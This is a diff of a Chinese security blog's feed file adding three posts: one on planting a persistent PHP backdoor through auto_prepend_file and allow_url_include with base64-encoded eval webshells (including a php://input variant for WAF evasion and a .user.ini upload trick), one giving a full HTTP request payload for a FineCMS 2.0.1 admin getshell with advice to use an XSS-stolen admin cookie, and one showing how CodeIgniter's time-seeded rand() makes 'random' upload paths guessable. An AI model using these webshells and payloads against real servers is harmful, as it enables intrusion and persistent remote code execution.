@@ -3,6 +3,560 @@
   
     
     <entry>
+      <title><![CDATA[PHP自动文件扩展安全研究]]></title>
+      <url>/2017/10/10/PHP%E8%87%AA%E5%8A%A8%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/</url>
+      <content type="html"><![CDATA[<p>今天在看TIPI的时候读到了$PHP_SRC/main/php_globals.h里面全局变量宏中全局变量是通过php.ini来加载赋值的。<br>里面有两个值[图1]<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *auto_append_file;</div><div class="line"><span class="keyword">char</span> *auto_prepend_file;</div></pre></td></tr></table></figure></p>
+<p>这两个可以在主文件之前自动解析。<br>那么就可以通过增加这两个值实现在其他文件夹放入我们的后门文件，并且在网站的任何一个目录用这个后门.</p>
+<a id="more"></a>
+<p><img src="/2017/10/10/PHP自动文件扩展安全研究/4247952283.png" alt="图1"></p>
+<p>php.ini中<br>增加<br>auto_prepend_file = “/path/to/your/file”</p>
+<p>假设我们放的是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">system(<span class="string">'la -al'</span>)</div></pre></td></tr></table></figure></p>
+<p>网站任意页面都会执行这段代码</p>
+<p><img src="/2017/10/10/PHP自动文件扩展安全研究/732587363.png" alt="5E8CAD57-CC76-4579-9DE4-208BC28728D6.png"></p>
+<p>和t00ls上朋友讨论，还可以配合</p>
+<p><code>allow_url_include=On</code><br>这个选项来无需文件，直接使用PHP的封装器来包括一句话。</p>
+<p>那位朋友给出的方案是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">allow_url_include=On</div><div class="line">auto_prepend_file=<span class="string">"data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pOz8+"</span></div></pre></td></tr></table></figure></p>
+<p>其中base64解码出来的是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_REQUEST[cmd]);<span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>个人感觉的话用$_REQUEST不太好，还可以改进一下。<br>用<code>php://input</code>比较好。</p>
+<p>因为如果用<code>php://input</code>的话，是可以用来绕过一部分waf的。</p>
+<p>所以我给出来的方案是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">allow_url_include=On</div><div class="line">auto_prepend_file = <span class="string">"data:;base64,PD9waHAgQGV2YWwoZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0JykpOw=="</span></div></pre></td></tr></table></figure></p>
+<p>测试<br><img src="/2017/10/10/PHP自动文件扩展安全研究/1646402056.png" alt="E73106EC-02A0-430F-8877-796CB797481C.png"><br>可以注意到用没有出现在RFC协议中的HTTP METHOD也可以代码执行了:)</p>
+<p>还有一个想法就是，假设有一个文件上传，限定了不能上传除了jpg的其它文件，可以通过上传一个.htaccess覆盖auto_prepend_file变量，再把机器DDOS重启，从而getshell</p>
+<p>========更新2========<br>.htaccess应该是不行的，原因如下：<br>Using php_flag or php_value in .htaccess files</p>
+<p>Some PHP scripts suggest using “php_value” or “php_flag” commands in .htaccess files, as in this example:</p>
+<p>php_value  include_path         “.:/usr/local/lib/php”<br>php_flag   display_errors       Off<br>php_value  upload_max_filesize  2M<br>However, our servers run PHP in “CGI mode” as recommended by the PHP developers (not as an Apache module), so you can’t use “php_value” or “php_flag” commands in .htaccess files. If you try to do so, you’ll see an “internal server error” message.</p>
+<p>You can modify your php.ini file to get the same effect, though. In fact, modifying php.ini is actually more flexible than using php_value or php_flag: there are many things you can’t override using .htaccess files, but you can override almost any PHP setting in the php.ini file.</p>
+<p>See our PHP support page for instructions on modifying php.ini. To get the same effect as the .htaccess lines above, you would simply add these lines to your custom php.ini file:</p>
+<p>include_path = “.:/usr/local/lib/php”<br>display_errors = Off<br>upload_max_filesize = 2M</p>
+<p>========更新3========<br>经过测试，上传.user.ini<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">allow_url_include=On</div><div class="line">auto_prepend_file = <span class="string">"data:;base64,PD9waHAgQGV2YWwoZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0JykpOw=="</span></div></pre></td></tr></table></figure></p>
+<p>包含以上的是可以getshell的，当前（目录下的任意文件可以命令执行）</p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[FineCMS 2.0.1 后台GETSHELL 0Day]]></title>
+      <url>/2017/10/10/FineCMS2-0-1%E5%90%8E%E5%8F%B0GETSHELL/</url>
+      <content type="html"><![CDATA[<p>FineCMS有一个缓存功能，和当初Wordpress一样，有一个缓存功能，并且缓存的文件名不是随机的并且后缀是php，就导致了可以利用后台缓存功能来getshell。</p>
+<p>下面是Payload</p>
+<a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">POST /index.php?s=admin&amp;c=category&amp;a=edit&amp;catid=13 HTTP/1.1</div><div class="line">Host: finecms2.0.1</div><div class="line">Content-Length: 813</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://finecms2.0.1</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://finecms2.0.1/index.php?s=admin&amp;c=category&amp;a=edit&amp;catid=13</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en;q=0.6</div><div class="line">Cookie: finecms_b1bf4_member_id=1; finecms_b1bf4_member_code=5bd1ebd88ad1c863ecc2; cod=10; csd=13; finecms_b1bf4_ci_session=a%3A7%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221f2b4dc45dd971bb0cd46febe32f5967%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10_11_5%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F51.0.2704.106+Safari%2F537.3%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1468985849%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22error_admin_login%22%3Bi%3A5%3Bs%3A7%3A%22user_id%22%3Bs%3A1%3A%221%22%3B%7D0edaafa3cae30c09ebb401c1ff2d76dd80c0ec91</div><div class="line">Connection: close</div><div class="line"></div><div class="line">catid=13&amp;typeid=2&amp;data%5Bparentid%5D=10&amp;data%5Bcatname%5D=123&amp;data%5Bcatdir%5D=123&amp;setting%5Bdocument%5D=&amp;data%5Bimage%5D=&amp;data%5Bismenu%5D=1&amp;data%5Burlpath%5D=&amp;abc=10&amp;data%5Bpagesize%5D=20&amp;data%5Bcategorytpl%5D=&amp;data%5Blisttpl%5D=&amp;data%5Bshowtpl%5D=page.html&amp;data%5Bmeta_title%5D=&amp;data%5Bmeta_keywords%5D=&amp;data%5Bmeta_description%5D=&amp;setting%5Bverifypost%5D=0&amp;setting%5Badminpost%5D=0&amp;setting%5Bmemberpost%5D=0&amp;setting%5Bguestpost%5D=0&amp;setting%5Bguestpost%5D=&amp;setting%5Burl%5D%5Buse%5D=0&amp;setting%5Burl%5D%5Btohtml%5D=0&amp;setting%5Burl%5D%5Bhtmldir%5D=html&amp;setting%5Burl%5D%5Blist%5D=&amp;setting%5Burl%5D%5Blist_page%5D=&amp;setting%5Burl%5D%5Bshow%5D=&amp;setting%5Burl%5D%5Bshow_page%5D=&amp;setting%5Burl%5D%5Bcatjoin%5D=%2F&amp;submit=%E6%8F%90%E4%BA%A4&amp;data%5Bcontent%5D=%3Cp%3E%0D%0A%09&quot;&#125;//%0D</div><div class="line">&lt;?php phpinfo();?&gt;</div><div class="line">%0D//&#123;&quot;%3C%2Fp%3E</div></pre></td></tr></table></figure>
+<p>把phpinfo();换成一句话，cookie换成XSS打到的管理员的就好。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 漏洞分析 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> 漏洞分析 </tag>
+            
+            <tag> 伪随机数 </tag>
+            
+            <tag> CodeIgniter </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[CodeIgniter伪随机数导致加密失效]]></title>
+      <url>/2017/10/10/CodeIgniter-Vul/</url>
+      <content type="html"><![CDATA[<p>首先来看一段CI内核在开启session储存在数据库选项的时候的操作.也就是</p>
+<p>/system/core/config.php</p>
+<p>内核配置文件设置为以下的时候</p>
+<p><code>$config[&#39;sess_use_database&#39;]    = true;</code></p>
+<a id="more"></a>
+<p>/system/libraries/Session/session.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($params = array<span class="params">()</span>)</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"></div><div class="line">log_message(<span class="string">'debug'</span>, <span class="string">"Session Class Initialized"</span>);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Set the super object to a local variable for use throughout the class</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;CI =&amp; get_instance();</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">if (defined('ci_session')) &#123;</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">return $this-&gt;CI-&gt;session;</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">&#125; else &#123;</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">define('ci_session', 1);</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">&#125;</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">*/</span></div><div class="line"></div><div class="line"><span class="comment">// Set all the session preferences, which can either be set</span></div><div class="line"></div><div class="line"><span class="comment">// manually via the $params array above or via the config file</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'sess_encrypt_cookie'</span>, <span class="string">'sess_use_database'</span>, <span class="string">'sess_table_name'</span>, <span class="string">'sess_expiration'</span>, <span class="string">'sess_expire_on_close'</span>, <span class="string">'sess_match_ip'</span>, <span class="string">'sess_match_useragent'</span>, <span class="string">'sess_cookie_name'</span>, <span class="string">'cookie_path'</span>, <span class="string">'cookie_domain'</span>, <span class="string">'cookie_secure'</span>, <span class="string">'sess_time_to_update'</span>, <span class="string">'time_reference'</span>, <span class="string">'cookie_prefix'</span>, <span class="string">'encryption_key'</span>) <span class="keyword">as</span> $key)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;$key = (<span class="keyword">isset</span>($params[$key])) ? $params[$key] : <span class="keyword">$this</span>-&gt;CI-&gt;config-&gt;item($key);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;encryption_key == <span class="string">''</span>)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;encryption_key == <span class="string">'finecms190'</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Load the string helper so we can use the strip_slashes() function</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;CI-&gt;load-&gt;helper(<span class="string">'string'</span>);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Do we need encryption? If so, load the encryption class</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;sess_encrypt_cookie == <span class="keyword">TRUE</span>)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;CI-&gt;load-&gt;library(<span class="string">'encrypt'</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Are we using a database?  If so, load it</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;sess_use_database === <span class="keyword">TRUE</span> <span class="keyword">AND</span> <span class="keyword">$this</span>-&gt;sess_table_name != <span class="string">''</span>)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;CI-&gt;load-&gt;database();</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Set the "now" time.  Can either be GMT or server time, based on the</span></div><div class="line"></div><div class="line"><span class="comment">// config prefs.  We use this to set the "last activity" time</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;now = <span class="keyword">$this</span>-&gt;_get_time();</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Set the session length. If the session expiration is</span></div><div class="line"></div><div class="line"><span class="comment">// set to zero we'll set the expiration two years from now.</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;sess_expiration == <span class="number">0</span>)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;sess_expiration = (<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">365</span>*<span class="number">2</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Set the cookie name</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;sess_cookie_name = <span class="keyword">$this</span>-&gt;cookie_prefix.<span class="keyword">$this</span>-&gt;sess_cookie_name;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Run the Session routine. If a session doesn't exist we'll</span></div><div class="line"></div><div class="line"><span class="comment">// create a new one.  If it does, we'll update it.</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> ( ! <span class="keyword">$this</span>-&gt;sess_read())</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;sess_create();</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">else</span></div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;sess_update();</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Delete 'old' flashdata (from last request)</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;_flashdata_sweep();</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Mark all new flashdata as old (data will be deleted before next request)</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;_flashdata_mark();</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Delete expired sessions if necessary</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;_sess_gc();</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">log_message(<span class="string">'debug'</span>, <span class="string">"Session routines successfully run"</span>);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>简单的用大白话来说，这段代码就是用来做一些对Session 的初始工作，检测配置，检测cookie是否设置等，检测配置最后有这个函数_sess_gc().这是每次请求的时候都会运行到的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_sess_gc</span><span class="params">()</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;sess_use_database != <span class="keyword">TRUE</span>)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">return</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">srand(time());</div><div class="line"></div><div class="line"><span class="keyword">if</span> ((rand() % <span class="number">100</span>) &lt; <span class="keyword">$this</span>-&gt;gc_probability)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">$expire = <span class="keyword">$this</span>-&gt;now - <span class="keyword">$this</span>-&gt;sess_expiration;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;CI-&gt;db-&gt;where(<span class="string">"last_activity &lt; &#123;$expire&#125;"</span>);</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;CI-&gt;db-&gt;delete(<span class="keyword">$this</span>-&gt;sess_table_name);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">log_message(<span class="string">'debug'</span>, <span class="string">'Session garbage collection performed.'</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以看到这里首先检测了是否开启了数据库储存session，如果开启就会以当前的时间设置一个种子。大家可能觉得没有什么问题</p>
+<p>首先我先介绍一下一个特性，我们在发送HTTP给PHP-CGI的时候</p>
+<p><img src="/2017/10/10/CodeIgniter-Vul/1046971727.png" alt="85D4315C-97CC-4B00-8857-BCD997B78171.png"></p>
+<p>这个请求对应的返回的时间戳，是php先生成的。</p>
+<p>假如当前是 10:00</p>
+<p>php代码是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">echo</span> <span class="string">"start"</span>;</div><div class="line"></div><div class="line">sleep(<span class="number">5</span>);</div><div class="line"></div><div class="line"><span class="comment">//Insert some code.</span></div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"pause"</span>;</div><div class="line"></div><div class="line">sleep(<span class="number">10</span>)</div></pre></td></tr></table></figure>
+<p>大家可能觉得返回的时间戳是请求接受到的时间+处理的时间。10:15</p>
+<p>实际上应该就是请求接收到的时间。</p>
+<p>为什么我要说这个呢？</p>
+<p>因为CI的框架本身代码执行时间就是等于返回的时间戳的时间。所以在运行到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">srand(time());</div></pre></td></tr></table></figure>
+<p>时候这里的time()就等于返回的时间戳。</p>
+<p>当种子设置为时间戳之后，之后所有的基于PRNG的函数全部变的可计算了。</p>
+<p>举个例子：</p>
+<p>FineCMS2.0.1有一个文件解压getshell漏洞</p>
+<p>详情可以看</p>
+<p>/bugs/wooyun-2010-064128</p>
+<p>这篇文章。</p>
+<p>官方的修复方案是将目录名称随机</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$temp = APP_ROOT.<span class="string">'cache/attack/'</span>.md5(uniqid().rand(<span class="number">0</span>, <span class="number">9999</span>)).<span class="string">'/'</span></div></pre></td></tr></table></figure>
+<p>让攻击者不可猜测，从而即使攻击者上传了shell之后，也找不到执行的目录。</p>
+<p>假设开启了数据库储存session选项之后。那么即使官方用了两个随机函数，一个加密函数，都变辣鸡。</p>
+<p>我们先来看uniqid()的php的内核源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(uniqid)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">char</span> *prefix = <span class="string">""</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__CYGWIN__)</span></div><div class="line"></div><div class="line">zend_bool more_entropy = <span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"></div><div class="line">zend_bool more_entropy = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="keyword">char</span> *uniqid;</div><div class="line"></div><div class="line"><span class="keyword">int</span> sec, usec, prefix_len = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, <span class="string">"|sb"</span>, &amp;prefix, &amp;prefix_len,</div><div class="line"></div><div class="line">&amp;more_entropy)) &#123;</div><div class="line"></div><div class="line"><span class="keyword">return</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> HAVE_USLEEP &amp;&amp; !defined(PHP_WIN32)</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!more_entropy) &#123;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__CYGWIN__)</span></div><div class="line"></div><div class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"You must use 'more entropy' under CYGWIN"</span>);</div><div class="line"></div><div class="line">RETURN_FALSE;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"></div><div class="line">usleep(<span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">gettimeofday((struct timeval *) &amp;tv, (struct timezone *) <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">sec = (<span class="keyword">int</span>) tv.tv_sec;</div><div class="line"></div><div class="line">usec = (<span class="keyword">int</span>) (tv.tv_usec % <span class="number">0x100000</span>);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* The max value usec can have is 0xF423F, so we use only five hex</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">* digits for usecs.</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">*/</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (more_entropy) &#123;</div><div class="line"></div><div class="line">spprintf(&amp;uniqid, <span class="number">0</span>, <span class="string">"%s%08x%05x%.8F"</span>, prefix, sec, usec, php_combined_lcg(TSRMLS_C) * <span class="number">10</span>);</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"></div><div class="line">spprintf(&amp;uniqid, <span class="number">0</span>, <span class="string">"%s%08x%05x"</span>, prefix, sec, usec);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">RETURN_STRING(uniqid, <span class="number">0</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="comment">/* &#125;&#125;&#125; */</span></div></pre></td></tr></table></figure>
+<p>可以看到uniqid()在默认情况下会生成13位”随机”数字，实际上就是将当前的时间戳变为16进制，8位秒以上的16进制+5位微秒时间戳而已。呵呵没错，又是时间戳。</p>
+<p>那么这时候就会变成，13位里面我们可以确定8位,剩下5位是我们不可见的。</p>
+<p>然后rand()的值，我们知道了种子，可以列出到达这里的rand()的随机值［根据rand()调用的次数］</p>
+<p>那么md5(uniqid().rand(0,9999))</p>
+<p>这个加密方法，实际上就变成了跑5位数0-F字典的问题了。</p>
